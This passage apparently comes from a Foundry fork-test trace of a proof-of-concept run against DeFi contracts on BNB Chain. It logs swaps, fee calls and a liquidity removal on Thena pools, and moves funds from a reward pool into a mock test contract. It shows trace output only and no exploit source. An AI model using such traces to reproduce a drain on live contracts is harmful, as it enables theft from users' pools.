    │   │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   ├─ [645] wUSDR::balanceOf(wUSDR_USDC: [0xA99c4051069B774102d6D215c6A9ba69BD616E6a]) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 1594717084062743 [1.594e15]
    │   │   │   │   │   ├─ [1296] USDC::balanceOf(wUSDR_USDC: [0xA99c4051069B774102d6D215c6A9ba69BD616E6a]) [staticcall]
    │   │   │   │   │   │   ├─ [553] 0xBA5Fe23f8a3a24BEd3236F05F2FcF35fd0BF0B5C::balanceOf(wUSDR_USDC: [0xA99c4051069B774102d6D215c6A9ba69BD616E6a]) [delegatecall]
    │   │   │   │   │   │   │   └─ ← [Return] 1669048547586724250573474 [1.669e24]
    │   │   │   │   │   │   └─ ← [Return] 1669048547586724250573474 [1.669e24]
    │   │   │   │   │   ├─ [1378] 0xAFD89d21BdB66d00817d4153E055830B1c2B3970::getFee(false) [staticcall]
    │   │   │   │   │   │   ├─ [559] 0x879F8Fd307bA4442e22e77d47683F35313760dC8::getFee(false) [delegatecall]
    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000014
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000014
    │   │   │   │   │   ├─ [1231] 0xAFD89d21BdB66d00817d4153E055830B1c2B3970::dibs() [staticcall]
    │   │   │   │   │   │   ├─ [415] 0x879F8Fd307bA4442e22e77d47683F35313760dC8::dibs() [delegatecall]
    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000664ce330511653cb2744b8ed50dba31c6c4c08ca
    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000664ce330511653cb2744b8ed50dba31c6c4c08ca
    │   │   │   │   │   ├─ [1202] 0xAFD89d21BdB66d00817d4153E055830B1c2B3970::MAX_REFERRAL_FEE() [staticcall]
    │   │   │   │   │   │   ├─ [386] 0x879F8Fd307bA4442e22e77d47683F35313760dC8::MAX_REFERRAL_FEE() [delegatecall]
    │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000004b0
    │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000004b0
    │   │   │   │   │   ├─ [8059] wUSDR::transfer(0x664cE330511653cB2744b8eD50DbA31C6c4C08ca, 4833593 [4.833e6])
    │   │   │   │   │   │   ├─ emit Transfer(from: wUSDR_USDC: [0xA99c4051069B774102d6D215c6A9ba69BD616E6a], to: 0x664cE330511653cB2744b8eD50DbA31C6c4C08ca, value: 4833593 [4.833e6])
    │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   ├─ [1223] 0xAFD89d21BdB66d00817d4153E055830B1c2B3970::stakingNFTFee() [staticcall]
    │   │   │   │   │   │   ├─ [407] 0x879F8Fd307bA4442e22e77d47683F35313760dC8::stakingNFTFee() [delegatecall]
    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000898
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000898
    │   │   │   │   │   ├─ [5603] 0x047B2316aD07241fAF8Ac638D67792e1f146A8A9::processStakingFees(7798197 [7.798e6], true)
    │   │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   │   ├─ [8059] wUSDR::transfer(0x047B2316aD07241fAF8Ac638D67792e1f146A8A9, 35446351 [3.544e7])
    │   │   │   │   │   │   ├─ emit Transfer(from: wUSDR_USDC: [0xA99c4051069B774102d6D215c6A9ba69BD616E6a], to: 0x047B2316aD07241fAF8Ac638D67792e1f146A8A9, value: 35446351 [3.544e7])
    │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   ├─ emit Fees(param0: UniV2Router: [0x20a304a7d126758dfe6B243D0fc515F83bCA8431], param1: 40279944 [4.027e7], param2: 0)
    │   │   │   │   │   ├─ [645] wUSDR::balanceOf(wUSDR_USDC: [0xA99c4051069B774102d6D215c6A9ba69BD616E6a]) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 1594717043782799 [1.594e15]
    │   │   │   │   │   ├─ [1296] USDC::balanceOf(wUSDR_USDC: [0xA99c4051069B774102d6D215c6A9ba69BD616E6a]) [staticcall]
    │   │   │   │   │   │   ├─ [553] 0xBA5Fe23f8a3a24BEd3236F05F2FcF35fd0BF0B5C::balanceOf(wUSDR_USDC: [0xA99c4051069B774102d6D215c6A9ba69BD616E6a]) [delegatecall]
    │   │   │   │   │   │   │   └─ ← [Return] 1669048547586724250573474 [1.669e24]
    │   │   │   │   │   │   └─ ← [Return] 1669048547586724250573474 [1.669e24]
    │   │   │   │   │   ├─ emit Sync(: 1594717043782799 [1.594e15], : 1669048547586724250573474 [1.669e24])
    │   │   │   │   │   ├─ emit Swap(sender: UniV2Router: [0x20a304a7d126758dfe6B243D0fc515F83bCA8431], amount0In: 20139972262 [2.013e10], amount1In: 0, amount0Out: 0, amount1Out: 21036826084489258165 [2.103e19], to: ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F])
    │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   ├─  emit topic 0: 0xff3715fa8f2d4d791dd7a610a545050b8c6fe3a62b0f6c38f2f96a00598fe483
    │   │   │   │   │        topic 1: 0x00000000000000000000000039e29f4fb13aec505ef32ee6ff7cc16e2225b11f
    │   │   │   │   │        topic 2: 0x00000000000000000000000039e29f4fb13aec505ef32ee6ff7cc16e2225b11f
    │   │   │   │   │           data: 0x00000000000000000000000000000000000000000000000000000004b06f96a60000000000000000000000002952beb1326accbb5243725bd4da2fc937bca087
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000004b06f96a600000000000000000000000000000000000000000000000123f1d1ddafa764b5
    │   │   │   ├─ [1296] USDC::balanceOf(ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F]) [staticcall]
    │   │   │   │   ├─ [553] 0xBA5Fe23f8a3a24BEd3236F05F2FcF35fd0BF0B5C::balanceOf(ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F]) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 21036826084489258165 [2.103e19]
    │   │   │   │   └─ ← [Return] 21036826084489258165 [2.103e19]
    │   │   │   ├─ [1296] USDC::balanceOf(ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F]) [staticcall]
    │   │   │   │   ├─ [553] 0xBA5Fe23f8a3a24BEd3236F05F2FcF35fd0BF0B5C::balanceOf(ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F]) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 21036826084489258165 [2.103e19]
    │   │   │   │   └─ ← [Return] 21036826084489258165 [2.103e19]
    │   │   │   ├─ [25308] USDC::approve(UniV2Router: [0x20a304a7d126758dfe6B243D0fc515F83bCA8431], 21036826084489258165 [2.103e19])
    │   │   │   │   ├─ [24562] 0xBA5Fe23f8a3a24BEd3236F05F2FcF35fd0BF0B5C::approve(UniV2Router: [0x20a304a7d126758dfe6B243D0fc515F83bCA8431], 21036826084489258165 [2.103e19]) [delegatecall]
    │   │   │   │   │   ├─ emit Approval(owner: ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F], spender: UniV2Router: [0x20a304a7d126758dfe6B243D0fc515F83bCA8431], value: 21036826084489258165 [2.103e19])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [0] console::log("thena swap in: %s out %s", 21036826084489258165 [2.103e19], 0) [staticcall]
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ [215114] UniV2Router::swapExactTokensForTokens(21036826084489258165 [2.103e19], 0, [(0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d, 0x55d398326f99059fF775485246999027B3197955, true)], ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F], 1679938553 [1.679e9])
    │   │   │   │   ├─ [1461] 0xAFD89d21BdB66d00817d4153E055830B1c2B3970::isPair(USDC_BUSD: [0x618f9Eb0E1a698409621f4F487B563529f003643]) [staticcall]
    │   │   │   │   │   ├─ [642] 0x879F8Fd307bA4442e22e77d47683F35313760dC8::isPair(USDC_BUSD: [0x618f9Eb0E1a698409621f4F487B563529f003643]) [delegatecall]
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   │   ├─ [14752] USDC_BUSD::getAmountOut(21036826084489258165 [2.103e19], USDC: [0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d]) [staticcall]
    │   │   │   │   │   ├─ [1368] 0xAFD89d21BdB66d00817d4153E055830B1c2B3970::getFee(true) [staticcall]
    │   │   │   │   │   │   ├─ [549] 0x879F8Fd307bA4442e22e77d47683F35313760dC8::getFee(true) [delegatecall]
    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   │   │   └─ ← [Return] 21022123566842377521 [2.102e19]
    │   │   │   │   ├─ [11586] USDC::transferFrom(ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F], USDC_BUSD: [0x618f9Eb0E1a698409621f4F487B563529f003643], 21036826084489258165 [2.103e19])
    │   │   │   │   │   ├─ [10834] 0xBA5Fe23f8a3a24BEd3236F05F2FcF35fd0BF0B5C::transferFrom(ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F], USDC_BUSD: [0x618f9Eb0E1a698409621f4F487B563529f003643], 21036826084489258165 [2.103e19]) [delegatecall]
    │   │   │   │   │   │   ├─ emit Transfer(from: ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F], to: USDC_BUSD: [0x618f9Eb0E1a698409621f4F487B563529f003643], value: 21036826084489258165 [2.103e19])
    │   │   │   │   │   │   ├─ emit Approval(owner: ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F], spender: UniV2Router: [0x20a304a7d126758dfe6B243D0fc515F83bCA8431], value: 0)
    │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   ├─ [174125] USDC_BUSD::swap(21022123566842377521 [2.102e19], 0, ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F], 0x)
    │   │   │   │   │   ├─ [1193] 0xAFD89d21BdB66d00817d4153E055830B1c2B3970::isPaused() [staticcall]
    │   │   │   │   │   │   ├─ [377] 0x879F8Fd307bA4442e22e77d47683F35313760dC8::isPaused() [delegatecall]
    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   │   ├─ [8071] BUSD::transfer(ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F], 21022123566842377521 [2.102e19])
    │   │   │   │   │   │   ├─ emit Transfer(from: USDC_BUSD: [0x618f9Eb0E1a698409621f4F487B563529f003643], to: ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F], value: 21022123566842377521 [2.102e19])
    │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   ├─ [531] BUSD::balanceOf(USDC_BUSD: [0x618f9Eb0E1a698409621f4F487B563529f003643]) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 6280644485202771492151320 [6.28e24]
    │   │   │   │   │   ├─ [1296] USDC::balanceOf(USDC_BUSD: [0x618f9Eb0E1a698409621f4F487B563529f003643]) [staticcall]
    │   │   │   │   │   │   ├─ [553] 0xBA5Fe23f8a3a24BEd3236F05F2FcF35fd0BF0B5C::balanceOf(USDC_BUSD: [0x618f9Eb0E1a698409621f4F487B563529f003643]) [delegatecall]
    │   │   │   │   │   │   │   └─ ← [Return] 7181426957155030371480156 [7.181e24]
    │   │   │   │   │   │   └─ ← [Return] 7181426957155030371480156 [7.181e24]
    │   │   │   │   │   ├─ [1368] 0xAFD89d21BdB66d00817d4153E055830B1c2B3970::getFee(true) [staticcall]
    │   │   │   │   │   │   ├─ [549] 0x879F8Fd307bA4442e22e77d47683F35313760dC8::getFee(true) [delegatecall]
    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   │   │   ├─ [1231] 0xAFD89d21BdB66d00817d4153E055830B1c2B3970::dibs() [staticcall]
    │   │   │   │   │   │   ├─ [415] 0x879F8Fd307bA4442e22e77d47683F35313760dC8::dibs() [delegatecall]
    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000664ce330511653cb2744b8ed50dba31c6c4c08ca
    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000664ce330511653cb2744b8ed50dba31c6c4c08ca
    │   │   │   │   │   ├─ [1202] 0xAFD89d21BdB66d00817d4153E055830B1c2B3970::MAX_REFERRAL_FEE() [staticcall]
    │   │   │   │   │   │   ├─ [386] 0x879F8Fd307bA4442e22e77d47683F35313760dC8::MAX_REFERRAL_FEE() [delegatecall]
    │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000004b0
    │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000004b0
    │   │   │   │   │   ├─ [8839] USDC::transfer(0x664cE330511653cB2744b8eD50DbA31C6c4C08ca, 252441913013871 [2.524e14])
    │   │   │   │   │   │   ├─ [8093] 0xBA5Fe23f8a3a24BEd3236F05F2FcF35fd0BF0B5C::transfer(0x664cE330511653cB2744b8eD50DbA31C6c4C08ca, 252441913013871 [2.524e14]) [delegatecall]
    │   │   │   │   │   │   │   ├─ emit Transfer(from: USDC_BUSD: [0x618f9Eb0E1a698409621f4F487B563529f003643], to: 0x664cE330511653cB2744b8eD50DbA31C6c4C08ca, value: 252441913013871 [2.524e14])
    │   │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   ├─ [1223] 0xAFD89d21BdB66d00817d4153E055830B1c2B3970::stakingNFTFee() [staticcall]
    │   │   │   │   │   │   ├─ [407] 0x879F8Fd307bA4442e22e77d47683F35313760dC8::stakingNFTFee() [delegatecall]
    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000898
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000898
    │   │   │   │   │   ├─ [5603] 0xABf4C5DD368eda2cFE40266b08e1B35DB802c0f1::processStakingFees(407272952995711 [4.072e14], false)
    │   │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   │   ├─ [8839] USDC::transfer(0xABf4C5DD368eda2cFE40266b08e1B35DB802c0f1, 1851240695435054 [1.851e15])
    │   │   │   │   │   │   ├─ [8093] 0xBA5Fe23f8a3a24BEd3236F05F2FcF35fd0BF0B5C::transfer(0xABf4C5DD368eda2cFE40266b08e1B35DB802c0f1, 1851240695435054 [1.851e15]) [delegatecall]
    │   │   │   │   │   │   │   ├─ emit Transfer(from: USDC_BUSD: [0x618f9Eb0E1a698409621f4F487B563529f003643], to: 0xABf4C5DD368eda2cFE40266b08e1B35DB802c0f1, value: 1851240695435054 [1.851e15])
    │   │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   ├─ emit Fees(param0: UniV2Router: [0x20a304a7d126758dfe6B243D0fc515F83bCA8431], param1: 0, param2: 2103682608448925 [2.103e15])
    │   │   │   │   │   ├─ [531] BUSD::balanceOf(USDC_BUSD: [0x618f9Eb0E1a698409621f4F487B563529f003643]) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 6280644485202771492151320 [6.28e24]
    │   │   │   │   │   ├─ [1296] USDC::balanceOf(USDC_BUSD: [0x618f9Eb0E1a698409621f4F487B563529f003643]) [staticcall]
    │   │   │   │   │   │   ├─ [553] 0xBA5Fe23f8a3a24BEd3236F05F2FcF35fd0BF0B5C::balanceOf(USDC_BUSD: [0x618f9Eb0E1a698409621f4F487B563529f003643]) [delegatecall]
    │   │   │   │   │   │   │   └─ ← [Return] 7181426955051347763031231 [7.181e24]
    │   │   │   │   │   │   └─ ← [Return] 7181426955051347763031231 [7.181e24]
    │   │   │   │   │   ├─ emit Sync(: 6280644485202771492151320 [6.28e24], : 7181426955051347763031231 [7.181e24])
    │   │   │   │   │   ├─ emit Swap(sender: UniV2Router: [0x20a304a7d126758dfe6B243D0fc515F83bCA8431], amount0In: 0, amount1In: 21036826084489258165 [2.103e19], amount0Out: 21022123566842377521 [2.102e19], amount1Out: 0, to: ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F])
    │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   ├─  emit topic 0: 0xff3715fa8f2d4d791dd7a610a545050b8c6fe3a62b0f6c38f2f96a00598fe483
    │   │   │   │   │        topic 1: 0x00000000000000000000000039e29f4fb13aec505ef32ee6ff7cc16e2225b11f
    │   │   │   │   │        topic 2: 0x00000000000000000000000039e29f4fb13aec505ef32ee6ff7cc16e2225b11f
    │   │   │   │   │           data: 0x00000000000000000000000000000000000000000000000123f1d1ddafa764b50000000000000000000000008ac76a51cc950d9822d68b83fe1ad97b32cd580d
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000123f1d1ddafa764b500000000000000000000000000000000000000000000000123bd96010a01f531
    │   │   │   ├─ [25171] BUSD::transfer(MockThenaRewardPool: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 108179753928089354377 [1.081e20])
    │   │   │   │   ├─ emit Transfer(from: ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F], to: MockThenaRewardPool: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 108179753928089354377 [1.081e20])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [632] 0x2e537237143ABf74A176d0067bEEbeEbe845300a::balanceOf(ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F]) [staticcall]
    │   │   │   │   └─ ← [Return] 156444250371137897 [1.564e17]
    │   │   │   ├─ [84354] 0x2e537237143ABf74A176d0067bEEbeEbe845300a::withdraw(156444250371137897 [1.564e17])
    │   │   │   │   ├─ [64072] wUSDR_USDC::transfer(ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F], 156444250371137897 [1.564e17])
    │   │   │   │   │   ├─ emit Transfer(from: 0x2e537237143ABf74A176d0067bEEbeEbe845300a, to: ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F], value: 156444250371137897 [1.564e17])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   ├─ emit Withdraw(param0: ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F], param1: 156444250371137897 [1.564e17])
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ [300] wUSDR_USDC::isStable() [staticcall]
    │   │   │   │   └─ ← [Return] false
    │   │   │   ├─ [8344] UniV2Router::quoteRemoveLiquidity(wUSDR: [0x2952beb1326acCbB5243725bd4Da2fC937BCa087], USDC: [0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d], false, 156444250371137897 [1.564e17]) [staticcall]
    │   │   │   │   ├─ [3802] 0xAFD89d21BdB66d00817d4153E055830B1c2B3970::getPair(wUSDR: [0x2952beb1326acCbB5243725bd4Da2fC937BCa087], USDC: [0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d], false) [staticcall]
    │   │   │   │   │   ├─ [2974] 0x879F8Fd307bA4442e22e77d47683F35313760dC8::getPair(wUSDR: [0x2952beb1326acCbB5243725bd4Da2fC937BCa087], USDC: [0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d], false) [delegatecall]
    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000a99c4051069b774102d6d215c6a9ba69bd616e6a
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000a99c4051069b774102d6d215c6a9ba69bd616e6a
    │   │   │   │   ├─ [620] wUSDR_USDC::getReserves() [staticcall]
    │   │   │   │   │   └─ ← [Return] 1594717043782799 [1.594e15], 1669048547586724250573474 [1.669e24], 1679938553 [1.679e9]
    │   │   │   │   ├─ [385] wUSDR_USDC::totalSupply() [staticcall]
    │   │   │   │   │   └─ ← [Return] 51591245139026378510 [5.159e19]
    │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000465eb6996ab0000000000000000000000000000000000000000000001125e1bd62a34a965dd
    │   │   │   ├─ [24629] wUSDR_USDC::approve(UniV2Router: [0x20a304a7d126758dfe6B243D0fc515F83bCA8431], 156444250371137897 [1.564e17])
    │   │   │   │   ├─ emit Approval(owner: ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F], spender: UniV2Router: [0x20a304a7d126758dfe6B243D0fc515F83bCA8431], value: 156444250371137897 [1.564e17])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [300] wUSDR_USDC::isStable() [staticcall]
    │   │   │   │   └─ ← [Return] false
    │   │   │   ├─ [93515] UniV2Router::removeLiquidity(wUSDR: [0x2952beb1326acCbB5243725bd4Da2fC937BCa087], USDC: [0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d], false, 156444250371137897 [1.564e17], 0, 0, ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F], 1679938553 [1.679e9])
    │   │   │   │   ├─ [39489] wUSDR_USDC::transferFrom(ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F], wUSDR_USDC: [0xA99c4051069B774102d6D215c6A9ba69BD616E6a], 156444250371137897 [1.564e17])
    │   │   │   │   │   ├─ emit Approval(owner: ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F], spender: UniV2Router: [0x20a304a7d126758dfe6B243D0fc515F83bCA8431], value: 0)
    │   │   │   │   │   ├─ emit Transfer(from: ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F], to: wUSDR_USDC: [0xA99c4051069B774102d6D215c6A9ba69BD616E6a], value: 156444250371137897 [1.564e17])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   ├─ [51167] wUSDR_USDC::burn(ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F])
    │   │   │   │   │   ├─ [645] wUSDR::balanceOf(wUSDR_USDC: [0xA99c4051069B774102d6D215c6A9ba69BD616E6a]) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 1594717043782799 [1.594e15]
    │   │   │   │   │   ├─ [1296] USDC::balanceOf(wUSDR_USDC: [0xA99c4051069B774102d6D215c6A9ba69BD616E6a]) [staticcall]
    │   │   │   │   │   │   ├─ [553] 0xBA5Fe23f8a3a24BEd3236F05F2FcF35fd0BF0B5C::balanceOf(wUSDR_USDC: [0xA99c4051069B774102d6D215c6A9ba69BD616E6a]) [delegatecall]
    │   │   │   │   │   │   │   └─ ← [Return] 1669048547586724250573474 [1.669e24]
    │   │   │   │   │   │   └─ ← [Return] 1669048547586724250573474 [1.669e24]
    │   │   │   │   │   ├─ emit Transfer(from: wUSDR_USDC: [0xA99c4051069B774102d6D215c6A9ba69BD616E6a], to: 0x0000000000000000000000000000000000000000, value: 156444250371137897 [1.564e17])
    │   │   │   │   │   ├─ [3259] wUSDR::transfer(ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F], 4835787773611 [4.835e12])
    │   │   │   │   │   │   ├─ emit Transfer(from: wUSDR_USDC: [0xA99c4051069B774102d6D215c6A9ba69BD616E6a], to: ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F], value: 4835787773611 [4.835e12])
    │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   ├─ [23939] USDC::transfer(ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F], 5061189125337114043869 [5.061e21])
    │   │   │   │   │   │   ├─ [23193] 0xBA5Fe23f8a3a24BEd3236F05F2FcF35fd0BF0B5C::transfer(ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F], 5061189125337114043869 [5.061e21]) [delegatecall]
    │   │   │   │   │   │   │   ├─ emit Transfer(from: wUSDR_USDC: [0xA99c4051069B774102d6D215c6A9ba69BD616E6a], to: ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F], value: 5061189125337114043869 [5.061e21])
    │   │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   ├─ [645] wUSDR::balanceOf(wUSDR_USDC: [0xA99c4051069B774102d6D215c6A9ba69BD616E6a]) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 1589881256009188 [1.589e15]
    │   │   │   │   │   ├─ [1296] USDC::balanceOf(wUSDR_USDC: [0xA99c4051069B774102d6D215c6A9ba69BD616E6a]) [staticcall]
    │   │   │   │   │   │   ├─ [553] 0xBA5Fe23f8a3a24BEd3236F05F2FcF35fd0BF0B5C::balanceOf(wUSDR_USDC: [0xA99c4051069B774102d6D215c6A9ba69BD616E6a]) [delegatecall]
    │   │   │   │   │   │   │   └─ ← [Return] 1663987358461387136529605 [1.663e24]
    │   │   │   │   │   │   └─ ← [Return] 1663987358461387136529605 [1.663e24]
    │   │   │   │   │   ├─ emit Sync(: 1589881256009188 [1.589e15], : 1663987358461387136529605 [1.663e24])
    │   │   │   │   │   ├─ emit Burn(sender: UniV2Router: [0x20a304a7d126758dfe6B243D0fc515F83bCA8431], amount0: 4835787773611 [4.835e12], amount1: 5061189125337114043869 [5.061e21], to: ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F])
    │   │   │   │   │   └─ ← [Return] 4835787773611 [4.835e12], 5061189125337114043869 [5.061e21]
    │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000465eb6996ab0000000000000000000000000000000000000000000001125e1bd62a34a965dd
    │   │   │   ├─ [645] wUSDR::balanceOf(ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F]) [staticcall]
    │   │   │   │   └─ ← [Return] 4835787773611 [4.835e12]
    │   │   │   ├─ [1296] USDC::balanceOf(ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F]) [staticcall]
    │   │   │   │   ├─ [553] 0xBA5Fe23f8a3a24BEd3236F05F2FcF35fd0BF0B5C::balanceOf(ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F]) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 5061189125337114043869 [5.061e21]
    │   │   │   │   └─ ← [Return] 5061189125337114043869 [5.061e21]
    │   │   │   ├─ [0] console::log("wUsdr: %s  usdc: %s", 4835787773611 [4.835e12], 5061189125337114043869 [5.061e21]) [staticcall]
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ [645] wUSDR::balanceOf(ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F]) [staticcall]
    │   │   │   │   └─ ← [Return] 4835787773611 [4.835e12]
    │   │   │   ├─ [300] wUSDR_USDC::isStable() [staticcall]
    │   │   │   │   └─ ← [Return] false
    │   │   │   ├─ [8650] UniV2Router::getAmountsOut(4835787773611 [4.835e12], [(0x2952beb1326acCbB5243725bd4Da2fC937BCa087, 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d, false)]) [staticcall]
    │   │   │   │   ├─ [1461] 0xAFD89d21BdB66d00817d4153E055830B1c2B3970::isPair(wUSDR_USDC: [0xA99c4051069B774102d6D215c6A9ba69BD616E6a]) [staticcall]
    │   │   │   │   │   ├─ [642] 0x879F8Fd307bA4442e22e77d47683F35313760dC8::isPair(wUSDR_USDC: [0xA99c4051069B774102d6D215c6A9ba69BD616E6a]) [delegatecall]
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   │   ├─ [3127] wUSDR_USDC::getAmountOut(4835787773611 [4.835e12], wUSDR: [0x2952beb1326acCbB5243725bd4Da2fC937BCa087]) [staticcall]
    │   │   │   │   │   ├─ [1378] 0xAFD89d21BdB66d00817d4153E055830B1c2B3970::getFee(false) [staticcall]
    │   │   │   │   │   │   ├─ [559] 0x879F8Fd307bA4442e22e77d47683F35313760dC8::getFee(false) [delegatecall]
    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000014
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000014
